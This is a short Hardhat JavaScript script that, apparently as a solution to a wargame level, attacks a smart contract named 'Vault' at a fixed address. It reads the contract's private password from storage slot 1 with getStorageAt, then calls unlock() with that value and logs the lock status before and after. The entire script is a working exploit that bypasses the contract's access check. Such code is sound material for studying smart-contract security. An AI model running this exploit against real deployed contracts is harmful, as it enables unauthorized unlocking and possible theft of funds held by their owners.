// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Vault";
  const contractAddress = "0xB984063f361C431ADBbd31b394227664d888633E";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [deployer, hacker, tester] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${deployer.address} \n`);

  // 👿 Hacking the contract
  // 📖 https://docs.ethers.io/v5/api/providers/provider/
  let pwdHackedByte32 = await ethers.provider.getStorageAt(contract.address, 1);

  // 🗣 Logging status
  console.log("🔑 Hacked password (byte32):", pwdHackedByte32);
  let locked = await contract.connect(deployer).locked();
  console.log("🔑 Lock status before unlocking:", locked);

  // Unlock the contract
  let unlockTx = await contract.connect(deployer).unlock(pwdHackedByte32);
  await unlockTx.wait((confirms = 1));

  // 🗣 Logging status
  locked = await contract.connect(deployer).locked();
  console.log("🔑 Locked status after unlocking:", locked);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
